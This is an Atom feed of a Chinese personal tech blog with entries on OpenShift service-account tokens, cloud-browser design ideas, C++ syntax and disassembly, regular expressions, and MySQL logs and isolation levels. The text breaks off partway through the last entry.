<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BlogSpace</title>
  
  
  <link href="https://blog.jumhorn.com/atom.xml" rel="self"/>
  
  <link href="https://blog.jumhorn.com/"/>
  <updated>2024-08-01T23:10:09.014Z</updated>
  <id>https://blog.jumhorn.com/</id>
  
  <author>
    <name>JumHorn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>openshift创建不过期的token</title>
    <link href="https://blog.jumhorn.com/openshift_service_account/"/>
    <id>https://blog.jumhorn.com/openshift_service_account/</id>
    <published>2024-05-09T18:35:51.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="openshift"><a href="#openshift" class="headerlink" title="openshift"></a>openshift</h1><pre><code>openshift用了有一段时间了，但是token每次都是只有24小时有效时间，导致我每天都要重新生成token。今天看到openshift service account的token有效期很长，就尝试创建。主要是如何创建token，使用方法和项目的token是一致的</code></pre><h2 id="oc命令行"><a href="#oc命令行" class="headerlink" title="oc命令行"></a>oc命令行</h2><ol><li><p>创建service account</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">serviceaccount <span class="string">&quot;robot&quot;</span> created</span></span><br><span class="line">oc create sa robot</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">view details of the service account created</span></span><br><span class="line">oc describe sa robot</span><br></pre></td></tr></table></figure></li><li><p>授权service account</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">grant permissions to service account</span></span><br><span class="line">oc policy add-role-to-user view system:serviceaccount:&lt;project-name&gt;:&lt;service account name&gt;</span><br><span class="line">oc policy add-role-to-user edit system:serviceaccount:&lt;project-name&gt;:&lt;service account name&gt;</span><br></pre></td></tr></table></figure></li><li><p>查看service account的token</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">oc describe sa robot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">output</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Name:        robot</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Namespace:   cookbook</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Labels:      &lt;none&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Annotations: &lt;none&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Image pull secrets: robot-dockercfg-vl9qn</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Mountable secrets:  robot-token-mhf9x</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">                    robot-dockercfg-vl9qn</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Tokens:             robot-token-4nkdw</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">                    robot-token-mhf9x</span></span><br></pre></td></tr></table></figure></li><li><p>查看access token</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">oc describe secret robot-token-mhf9x</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">output</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Name:        robot-token-mhf9x</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Namespace:   cookbook</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Labels:      &lt;none&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Annotations: kubernetes.io/service-account.name=robot</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Type:        kubernetes.io/service-account-token</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Data</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">====</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ca.crt:         1070 bytes</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">namespace:      8 bytes</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">service-ca.crt: 2186 bytes</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">token:          eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...</span></span><br></pre></td></tr></table></figure><p> 最后的token便是用于http请求时的access token</p></li></ol><h1 id="other-command"><a href="#other-command" class="headerlink" title="other command"></a>other command</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">show all service accounts <span class="keyword">in</span> this project</span></span><br><span class="line">oc get sa</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">revoke service account token</span></span><br><span class="line">oc delete secret robot-token-mhf9x</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">create service account token (expire: --duration 2400h)</span></span><br><span class="line">oc create token your-service-account --duration 2400h</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;openshift&quot;&gt;&lt;a href=&quot;#openshift&quot; class=&quot;headerlink&quot; title=&quot;openshift&quot;&gt;&lt;/a&gt;openshift&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;openshift用了有一段时间了，但是token每次都是只有24小</summary>
      
    
    
    
    
    <category term="技术" scheme="https://blog.jumhorn.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>云浏览器</title>
    <link href="https://blog.jumhorn.com/remote_browser/"/>
    <id>https://blog.jumhorn.com/remote_browser/</id>
    <published>2024-03-27T22:48:37.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cloud-Browser"><a href="#Cloud-Browser" class="headerlink" title="Cloud Browser"></a>Cloud Browser</h1><pre><code>看到很多网站云浏览器,想思考一下该技术的实现方案。云浏览器可以共享，多人使用同一个账号特别方便</code></pre><blockquote><p><a href="https://hyperbeam.com/">https://hyperbeam.com</a></p></blockquote><h2 id="方案1"><a href="#方案1" class="headerlink" title="方案1"></a>方案1</h2><pre><code>直接使用原网站API，该方法属于逆向行为。在ChatGPT刚出来的时候，很多逆向了openai的前端，找到API和token，然后直接调用API，跳过cloudflare检测。该方案简单，就是原网站可以随时变更API，逆向代价太大。</code></pre><h2 id="方案2"><a href="#方案2" class="headerlink" title="方案2"></a>方案2</h2><pre><code>远程屏幕共享属于粗暴的解决方法了，导致带宽增大。服务器压力增大</code></pre><h2 id="方案3"><a href="#方案3" class="headerlink" title="方案3"></a>方案3</h2><pre><code>基于浏览器自动化测试开源项目，将headless chrome部署到服务器上headless无界面和headful在运行上还是有一些差别的</code></pre><h2 id="方案4"><a href="#方案4" class="headerlink" title="方案4"></a>方案4</h2><pre><code>基于chrome devtools protocal,将chrome调试的API转为http服务该方案我只是猜想，还没有完全理解，chrome调试也可以客户端和服务端同时查看和修改同一个网页。具体chrome devtools protocal通信哪些内容还有待继续深入</code></pre><h2 id="方案5"><a href="#方案5" class="headerlink" title="方案5"></a>方案5</h2><pre><code>基于vscode server,在vscode server启动simple browser即可该方案不成立，code server的browser就是本地浏览器，使用的cookie都是本地的，和服务端没有关系</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Cloud-Browser&quot;&gt;&lt;a href=&quot;#Cloud-Browser&quot; class=&quot;headerlink&quot; title=&quot;Cloud Browser&quot;&gt;&lt;/a&gt;Cloud Browser&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;看到很多网站云浏览器,想思考一下该技</summary>
      
    
    
    
    
    <category term="技术" scheme="https://blog.jumhorn.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>C++语法糖</title>
    <link href="https://blog.jumhorn.com/cpp_syntax/"/>
    <id>https://blog.jumhorn.com/cpp_syntax/</id>
    <published>2024-03-05T10:35:23.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><h2 id="const"><a href="#const" class="headerlink" title="const"></a>const</h2><ol><li>const变量<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// expression must be a modifiable lvalue</span></span><br><span class="line"><span class="type">int</span> <span class="type">const</span> *p;<span class="comment">//指针内容不可改</span></span><br><span class="line"><span class="type">int</span>* <span class="type">const</span> p;<span class="comment">//指针不可改变指向</span></span><br></pre></td></tr></table></figure></li><li>const修饰函数<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可以直接echo(&quot;hello world&quot;);调用</span></span><br><span class="line"><span class="comment">// 如果没有const会报错</span></span><br><span class="line"><span class="comment">// a reference of type string(not const-qualified) can not be initailized with a value of const char *</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">echo</span><span class="params">(<span class="type">const</span> string&amp; str)</span></span>;</span><br></pre></td></tr></table></figure></li><li>const修饰this指针<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setHeight</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//expression must be a modifiable lvalue</span></span><br><span class="line">height = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> height;</span><br><span class="line"><span class="type">int</span> weight;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><ol><li>作用域<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 全局变量只在当前文件内可见</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> global_val = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li></ol><h2 id="cast"><a href="#cast" class="headerlink" title="cast"></a>cast</h2><ol><li>const_cast</li><li>static_cast</li><li>dynamic_cast</li><li>reinterpret_cast</li></ol><h2 id="new-vs-malloc"><a href="#new-vs-malloc" class="headerlink" title="new vs malloc"></a>new vs malloc</h2><ol><li>placement new</li></ol><h2 id="object-oriented"><a href="#object-oriented" class="headerlink" title="object-oriented"></a>object-oriented</h2><ol><li>继承</li><li>封装</li><li>多态</li></ol><h2 id="reflection"><a href="#reflection" class="headerlink" title="reflection"></a>reflection</h2><ol><li>typeid</li><li>type_info</li></ol><h1 id="技巧性"><a href="#技巧性" class="headerlink" title="技巧性"></a>技巧性</h1><ol><li>设计一个只能在堆上生成的对象</li><li>设计一个只能在堆上生成的对象</li></ol><h1 id="必要性"><a href="#必要性" class="headerlink" title="必要性"></a>必要性</h1><ol><li>virtual destructor<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Base</span>();</span><br><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">Base</span>();<span class="comment">//用基类的指针删除派生类对象,会调用派生类析构函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h1 id="破坏性"><a href="#破坏性" class="headerlink" title="破坏性"></a>破坏性</h1><ol><li>friend</li><li>mutable</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;C&quot;&gt;&lt;a href=&quot;#C&quot; class=&quot;headerlink&quot; title=&quot;C++&quot;&gt;&lt;/a&gt;C++&lt;/h1&gt;&lt;h2 id=&quot;const&quot;&gt;&lt;a href=&quot;#const&quot; class=&quot;headerlink&quot; title=&quot;const&quot;&gt;&lt;/a&gt;cons</summary>
      
    
    
    
    
    <category term="架构" scheme="https://blog.jumhorn.com/tags/%E6%9E%B6%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>C++反汇编</title>
    <link href="https://blog.jumhorn.com/cpp_assembly/"/>
    <id>https://blog.jumhorn.com/cpp_assembly/</id>
    <published>2024-02-29T16:59:11.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><pre><code>学习C++就要了解编译器，就要学会反汇编，要知道编译器自动做了哪些工作。</code></pre><h2 id="g"><a href="#g" class="headerlink" title="g++"></a>g++</h2><ul><li><p>使用预处理：</p><p>  包括 条件编译(#ifdef)，行控制(#pragma)，文件包含（#include），宏定义(#define)。不包括模版实例化，目前主流编译器也没有模版实例化中间代码，实例化是在预处理之后的</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i</span><br></pre></td></tr></table></figure><ul><li><p>使用汇编：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.c -o hello.s</span><br></pre></td></tr></table></figure></li><li><p>使用调试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g hello.c -o hello</span><br></pre></td></tr></table></figure></li><li><p>使用优化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -O2 hello.c -o hello</span><br></pre></td></tr></table></figure></li><li><p>使用交叉编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 hello.c -o hello</span><br></pre></td></tr></table></figure></li></ul><h1 id="assembly"><a href="#assembly" class="headerlink" title="assembly"></a>assembly</h1><h2 id="g-1"><a href="#g-1" class="headerlink" title="g++"></a>g++</h2><ul><li>使用汇编：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.c -o hello.s</span><br></pre></td></tr></table></figure>  生产hello.s文件，可以查看该文件的汇编代码</li></ul><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><pre><code>也可以si单步进入到汇编</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble /m</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or</span></span><br><span class="line">(gdb) si</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">4               i=i++;</span><br><span class="line">(gdb) disassemble /m</span><br><span class="line">Dump of assembler code for function main():</span><br><span class="line">2       &#123;</span><br><span class="line">   0x0000555555555125 &lt;+0&gt;:     push   %rbp</span><br><span class="line">   0x0000555555555126 &lt;+1&gt;:     mov    %rsp,%rbp</span><br><span class="line"></span><br><span class="line">3               int i=0;</span><br><span class="line">   0x0000555555555129 &lt;+4&gt;:     movl   $0x0,-0x4(%rbp)</span><br><span class="line"></span><br><span class="line">4               i=i++;</span><br><span class="line">=&gt; 0x0000555555555130 &lt;+11&gt;:    mov    -0x4(%rbp),%eax</span><br><span class="line">   0x0000555555555133 &lt;+14&gt;:    lea    0x1(%rax),%edx</span><br><span class="line">   0x0000555555555136 &lt;+17&gt;:    mov    %edx,-0x4(%rbp)</span><br><span class="line">   0x0000555555555139 &lt;+20&gt;:    mov    %eax,-0x4(%rbp)</span><br><span class="line"></span><br><span class="line">5               return 0;</span><br><span class="line">   0x000055555555513c &lt;+23&gt;:    mov    $0x0,%eax</span><br><span class="line"></span><br><span class="line">6       &#125;</span><br><span class="line">   0x0000555555555141 &lt;+28&gt;:    pop    %rbp</span><br><span class="line">   0x0000555555555142 &lt;+29&gt;:    ret</span><br><span class="line"></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;C&quot;&gt;&lt;a href=&quot;#C&quot; class=&quot;headerlink&quot; title=&quot;C++&quot;&gt;&lt;/a&gt;C++&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;学习C++就要了解编译器，就要学会反汇编，要知道编译器自动做了哪些工作。
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;g&quot;&gt;</summary>
      
    
    
    
    
    <category term="架构" scheme="https://blog.jumhorn.com/tags/%E6%9E%B6%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://blog.jumhorn.com/regex/"/>
    <id>https://blog.jumhorn.com/regex/</id>
    <published>2024-02-29T15:37:05.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正则表达式（Regular-Expression）"><a href="#正则表达式（Regular-Expression）" class="headerlink" title="正则表达式（Regular Expression）"></a>正则表达式（Regular Expression）</h1><h2 id="特殊字符（Special-Characters）"><a href="#特殊字符（Special-Characters）" class="headerlink" title="特殊字符（Special Characters）"></a>特殊字符（Special Characters）</h2><pre><code>正则表达式中一些字符具有特殊的含义，它们用于表示一类字符或者进行匹配操作。例如：</code></pre><ul><li>\d：匹配任意数字。</li><li>\w：匹配任意字母、数字、或下划线。</li><li>\s：匹配任意空白字符。</li><li>.：匹配除换行符外的任意单个字符。</li></ul><h2 id="字符类（Character-Classes）"><a href="#字符类（Character-Classes）" class="headerlink" title="字符类（Character Classes）"></a>字符类（Character Classes）</h2><pre><code>使用方括号[]来定义一组可匹配的字符，例如[aeiou]表示匹配任意一个元音字母。使用方括号()来定义一组可匹配的字符，例如(aeiou)表示匹配字符串&quot;aeiou&quot;。</code></pre><h2 id="重复次数（Repetitions）"><a href="#重复次数（Repetitions）" class="headerlink" title="重复次数（Repetitions）"></a>重复次数（Repetitions）</h2><pre><code>使用限定符来表示字符或者字符类的重复次数。例如：</code></pre><ul><li>*：匹配前面的字符零次或多次。</li><li>+：匹配前面的字符一次或多次。</li><li>?：匹配前面的字符零次或一次。</li><li>{n}：匹配前面的字符恰好 n 次。</li><li>{n,}：匹配前面的字符至少 n 次。</li><li>{n,m}：匹配前面的字符至少 n 次，但不超过 m 次。</li></ul><h2 id="边界匹配（Anchors）"><a href="#边界匹配（Anchors）" class="headerlink" title="边界匹配（Anchors）"></a>边界匹配（Anchors）</h2><pre><code>用于指定匹配的位置，例如：</code></pre><ul><li>^：匹配字符串的开头。</li><li>$：匹配字符串的结尾。</li><li>\b：匹配单词边界。</li><li>\B：匹配非单词边界。</li></ul><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><h2 id="匹配IP地址"><a href="#匹配IP地址" class="headerlink" title="匹配IP地址"></a>匹配IP地址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.)&#123;3&#125;(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$</span><br></pre></td></tr></table></figure><pre><code>这个表达式的组成部分解释如下：</code></pre><ol><li>25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9]：这个部分用于匹配0到255的数字。具体来说，它匹配250-255 (25[0-5]), 200-249 (2[0-4][0-9]), 100-199 (1[0-9][0-9]), 和0-99 ([1-9]?[0-9])。</li><li>(……).：这个部分用于匹配三个点加数字的模式，比如”192.”。</li><li>{3}：这个部分表示前面的模式会重复三次，用于匹配IP地址的前三段。</li><li>最后的部分: (25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9]) 同样用于匹配0到255的数字，对应IP地址的最后一段</li></ol><h2 id="匹配yyyy-mm-dd格式的日期"><a href="#匹配yyyy-mm-dd格式的日期" class="headerlink" title="匹配yyyy-mm-dd格式的日期"></a>匹配yyyy-mm-dd格式的日期</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^((19|20)\d\d)-(0[1-9]|1[012])-(0[1-9]|[12][0-9]|3[01])$</span><br></pre></td></tr></table></figure><ol><li><p>((19|20)\d\d) : 这部分用于匹配年份，可以匹配从1900到2099的年份。在这部分，“\d” 是一个占位符，代表任何数字。</p></li><li><p>-(0[1-9]|1[012]) : 这部分用于匹配月份。可以匹配从 “01” 到 “09” 以及 “10”, “11”, “12” 这三个月份。</p></li><li><p>-(0[1-9]|[12][0-9]|3[01]) : 这部分用于匹配日期。可以匹配从 “01” 到 “09”，”10” 到 “19”， “20” 到 “29”，以及 “30”, “31” 这两个日期。</p><p> 但是这个正则表达式有一个限制，它并没有在2月份考虑29天（对于闰年而言），并且它也会匹配那些只有30天的月份的31日（如4月、6月、9月和11月）。要完全校验一个日期的正确性，可能最好的方法是使用日期解析函数而不是正则表达式</p></li></ol><h1 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h1><ol><li>如何使用vscode搜索中的正则表达式</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;正则表达式（Regular-Expression）&quot;&gt;&lt;a href=&quot;#正则表达式（Regular-Expression）&quot; class=&quot;headerlink&quot; title=&quot;正则表达式（Regular Expression）&quot;&gt;&lt;/a&gt;正则表达式（Regul</summary>
      
    
    
    
    
    <category term="架构" scheme="https://blog.jumhorn.com/tags/%E6%9E%B6%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>数据库日志</title>
    <link href="https://blog.jumhorn.com/mysql_log/"/>
    <id>https://blog.jumhorn.com/mysql_log/</id>
    <published>2024-02-19T17:45:39.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><pre><code>1. mysql如何通过日记实现不同类型的锁2. mysql如何通过日志实现主从复制</code></pre><h1 id="binlog"><a href="#binlog" class="headerlink" title="binlog"></a>binlog</h1><pre><code>Binlog 是 MySQL 中用于记录所有对数据的修改操作的一种二进制日志文件。用于数据的备份和恢复。它记录了执行的所有数据修改语句，如 INSERT、UPDATE、DELETE 等，但不包括 SELECT 查询。Binlog 是用于复制、恢复和灾难恢复的关键工具。通过在主服务器上创建 Binlog，可以将数据复制到从服务器上。Binlog 可以启用主从复制（master-slave replication）和事务日志（transaction logging）等功能</code></pre><h1 id="redolog"><a href="#redolog" class="headerlink" title="redolog"></a>redolog</h1><pre><code>Redo Log 是 InnoDB 存储引擎特有的日志文件，用于记录事务所做的修改操作。用于数据写入磁盘和持久化。它在事务提交时记录数据页的物理变更，而不是逻辑变更。Redo Log 的作用是在数据库崩溃时，通过重新执行重做日志中的操作，来恢复数据库到事务提交之后的状态，确保数据的一致性和持久性。Redo Log 是循环写的，所以相对于数据文件的大小，它比较小。</code></pre><h1 id="undolog"><a href="#undolog" class="headerlink" title="undolog"></a>undolog</h1><pre><code>Undo Log 也是 InnoDB 存储引擎特有的日志文件，用于在事务回滚或者 MVCC（多版本并发控制）中提供数据的一致性。当一个事务执行时，如果需要对数据进行修改，则会先将原始数据写入 Undo Log，然后再进行修改。这样可以在事务回滚时使用 Undo Log 来撤销对数据的修改操作，保证事务的原子性。Undo Log 也用于实现 MVCC，通过保存事务之前的数据版本，可以实现读取到数据的快照，而不会被其他事务的修改所影响。InnoDB 存储引擎使用 Undo Log 来确保事务的原子性、一致性和隔离性。</code></pre><h1 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h1><ol><li><p>多版本并发控制 MVCC(Multi-Version Concurrency Control)</p><p> undo log有什么作用</p></li><li><p>Next-Key Locking</p><p> 如何避免幻读</p></li><li><p>二阶段提交</p><p> MySQL开启binlog日志的情况下，事务的提交要同时完成redolog和binlog的事务写入，保证redolog和binlog是一致的</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;日志&quot;&gt;&lt;a href=&quot;#日志&quot; class=&quot;headerlink&quot; title=&quot;日志&quot;&gt;&lt;/a&gt;日志&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;1. mysql如何通过日记实现不同类型的锁
2. mysql如何通过日志实现主从复制
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 </summary>
      
    
    
    
    
    <category term="架构" scheme="https://blog.jumhorn.com/tags/%E6%9E%B6%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>数据库事务的隔离级别</title>
    <link href="https://blog.jumhorn.com/mysql_isolation/"/>
    <id>https://blog.jumhorn.com/mysql_isolation/</id>
    <published>2024-02-19T17:10:58.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ACID"><a href="#ACID" class="headerlink" title="ACID"></a>ACID</h1><h2 id="原子性-atomicity"><a href="#原子性-atomicity" class="headerlink" title="原子性(atomicity)"></a>原子性(atomicity)</h2><h2 id="一致性-consistency"><a href="#一致性-consistency" class="headerlink" title="一致性(consistency)"></a>一致性(consistency)</h2><h2 id="隔离性-isolation"><a href="#隔离性-isolation" class="headerlink" title="隔离性(isolation)"></a>隔离性(isolation)</h2><h2 id="持久性-durability"><a href="#持久性-durability" class="headerlink" title="持久性(durability)"></a>持久性(durability)</h2><h1 id="隔离级别-isolation"><a href="#隔离级别-isolation" class="headerlink" title="隔离级别(isolation)"></a>隔离级别(isolation)</h1><pre><code>数据库事务的隔离级别和锁的实现密切相关，理解事务隔离级别，就明白为什么innodb要支持不同的锁，以及不同隔离级别下，使用不同的锁。业务的设计往往为了并发又要控制锁的粒度所以学习方向是，先看事务隔离级别，再看锁是满足哪种事务隔离级别，最后看binlog,redolog如何实现这些锁</code></pre><h2 id="读未提交-READ-UNCOMMITTED"><a href="#读未提交-READ-UNCOMMITTED" class="headerlink" title="读未提交(READ UNCOMMITTED)"></a>读未提交(READ UNCOMMITTED)</h2><pre><code>事务可以读取未提交的数据，可能会导致脏读、不可重复读和幻读问题</code></pre><h2 id="读已提交-READ-COMMITTED"><a href="#读已提交-READ-COMMITTED" class="headerlink" title="读已提交(READ COMMITTED)"></a>读已提交(READ COMMITTED)</h2><pre><code>事务只能读取已经提交的数据，避免了脏读，但仍可能出现不可重复读和幻读问题</code></pre><h2 id="可重复读-REPEATABLE-READ"><a href="#可重复读-REPEATABLE-READ" class="headerlink" title="可重复读(REPEATABLE READ)"></a>可重复读(REPEATABLE READ)</h2><pre><code>保证了事务在执行过程中读取的数据是一致的，即使其他事务对数据进行了修改也不会影响当前事务的查询结果。但仍可能出现幻读问题</code></pre><h2 id="序列化-SERIALIZABLE"><a href="#序列化-SERIALIZABLE" class="headerlink" title="序列化(SERIALIZABLE)"></a>序列化(SERIALIZABLE)</h2><pre><code>通过强制事务串行执行来避免脏读、不可重复读和幻读。但是这可能会降低并发性能</code></pre><h1 id="FAQ"><a href="#FAQ" class="headerlink" 